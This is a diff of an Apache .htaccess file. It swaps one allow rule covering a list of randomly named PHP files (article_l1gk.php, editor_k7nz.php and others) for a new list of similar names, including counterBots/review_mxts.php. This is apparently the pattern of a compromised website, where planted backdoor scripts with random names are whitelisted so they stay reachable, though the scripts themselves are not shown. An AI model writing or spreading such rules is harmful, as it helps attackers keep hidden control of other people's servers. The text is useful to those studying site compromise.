@@ -84,7 +84,7 @@ Options -Indexes
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(article_l1gk.php|author_f6pf.php|article_dn8u.php|author_gbon.php|editor_k7nz.php|article_o7wn.php|article_396k.php|author_a3g3.php|editor_rw6f.php|review_3jhw.php|submission_6acs.php|article_xxwa.php|author_e1k9.php|article_ecu0.php)$"> 
+<FilesMatch "^(article_h7pg.php|author_31c1.php|article_1555.php|author_tl8q.php|editor_45tg.php|article_j7ms.php|author_bpiu.php|editor_56d5.php|counterBots/review_mxts.php|index.php)$"> 
 Order Allow,Deny 
 Allow from all 
 </FilesMatch>
